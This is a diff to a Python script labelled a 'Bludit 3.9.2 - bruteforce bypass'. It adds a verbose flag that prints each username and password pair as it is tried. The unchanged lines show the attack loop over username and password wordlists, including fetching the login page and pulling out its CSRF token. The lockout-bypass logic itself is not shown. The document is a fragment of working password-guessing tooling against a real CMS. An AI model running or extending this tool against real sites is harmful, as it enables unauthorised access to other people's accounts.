@@ -9,7 +9,7 @@ usernames_file_list = ""
 passwords_file_list = ""
 usernames_list = ""
 passwords_list = ""
-
+verbose = False
 
 def help():
 	print("Bludit 3.9.2 - bruteforce bypass")
@@ -22,7 +22,7 @@ def help():
 
 
 try:
-	option_value_pair, arguments_left = getopt.getopt(sys.argv[1:], 'hl:u:p:')
+	option_value_pair, arguments_left = getopt.getopt(sys.argv[1:], 'vhl:u:p:')
 except getopt.GetoptError as error:
         print str(error)
 
@@ -35,6 +35,8 @@ for option, value in option_value_pair:
 		usernames_file_list = value
 	elif option in ('-p'):
 		passwords_file_list = value
+	elif option in ('-v'):
+		verbose = True
 	else: help()
 
 
@@ -49,7 +51,8 @@ if not login_url or not usernames_file_list or not passwords_file_list:
 print("Starting bruteforce...")
 for username in (open(usernames_file_list, 'r')).readlines(): 
 	for password in (open(passwords_file_list, 'r')).readlines(): 
-
+		if verbose:			
+			print('Testing {u}:{p}'.format(u = username.strip(), p = password.strip()))
 		session = requests.Session()
 		login_page = session.get(login_url)
 		csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
